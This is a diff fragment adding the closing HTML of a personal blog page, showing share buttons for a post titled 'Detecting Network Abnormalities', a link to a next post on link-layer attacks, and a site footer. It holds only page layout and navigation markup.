+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f&amp;resubmit=true&amp;title=Detecting%20Network%20Abnormalities" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f;title=Detecting%20Network%20Abnormalities" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Detecting%20Network%20Abnormalities%20http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f&amp;t=Detecting%20Network%20Abnormalities" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Detecting%20Network%20Abnormalities&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+        </div>
+
+      
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="http://localhost:1313/posts/2026/04/link-layer-attacks/">
+                    <span class="button__text">Link Layer Attacks</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+      
+
+      
+
+      
+
+    </main>
+  </div>
+
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2026</span>
+            <span><a href="http://localhost:1313/">Mostafa Ashour</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://github.com/Mostafa-Ashour">Ashour</a></span><span>Made with &#10084; by <a href="https://www.linkedin.com/in/mostafa-ashour-b82b0524b">Mostafa Ashour</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="http://localhost:1313/bundle.min.08b680078a3cf9c69e3dd217a5aa52cfddd4a1d850f8cdff127fdd7421a71f8b2b474be69386f67819edace92273916e7230c9054f38107db9dc6730b3530ab5.js" integrity="sha512-CLaAB4o8&#43;caePdIXpapSz93UodhQ&#43;M3/En/ddCGnH4srR0vmk4b2eBntrOkic5FucjDJBU84EH253Gcws1MKtQ=="></script>
+
+
+
+
+    </body>
+</html>
